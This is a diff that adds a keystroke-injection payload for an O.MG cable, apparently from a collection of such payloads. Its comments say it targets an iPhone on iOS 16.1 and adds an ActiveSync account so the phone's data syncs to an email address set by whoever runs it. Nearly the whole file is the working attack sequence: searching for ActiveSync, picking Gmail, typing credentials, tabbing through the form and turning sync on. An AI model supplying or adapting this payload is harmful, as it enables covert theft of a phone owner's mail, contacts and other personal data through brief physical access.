@@ -1,0 +1,74 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: This payload adds a active sync account to icloud to sync data from a iPhone to a email address
+REM NOITCE Payload was made on iOS 16.1 - iPhone | Timing may have have to be changed based on version/model
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, ative end of the O.MG cable must be plugged into the end of the adapter\
+REM NOTICE This Payload requires full keyboard access to be turned on 
+REM NOTICE This payload was adding a Gmail to ative sync, the amounts of TAB and DOWN ARROWS will be diffrent with diffrent email services
+REM [Thanks Kalani for the idea to write a payload for AtiveSync and always inspiring me :)  ] 
+GUI h
+DELAY 100
+GUI h 
+GUI SPACE 
+DELAY 500
+STRING ActiveSync
+DELAY 150
+ENTER
+DELAY 500
+DOWN ARROW
+DELAY 150
+SPACE 
+REM NOTICE ''The Amount of Down arrows determines which email service is used, we will use gmail in this payload ''
+DELAY 150
+DOWN ARROW
+DELAY 150
+DOWN ARROW
+DELAY 100
+SPACE
+DELAY 1000
+STRING "EMAIL"
+DELAY 1000
+STRING "PASSWORD"
+DELAY 1500
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+TAB 
+DELAY 150
+ENTER
+DELAY 1500
+DOWN ARROW 
+DELAY 150
+DOWN ARROW 
+DELAY 150
+DOWN ARROW 
+DELAY 150
+SPACE
+DELAY 150
+GUI h
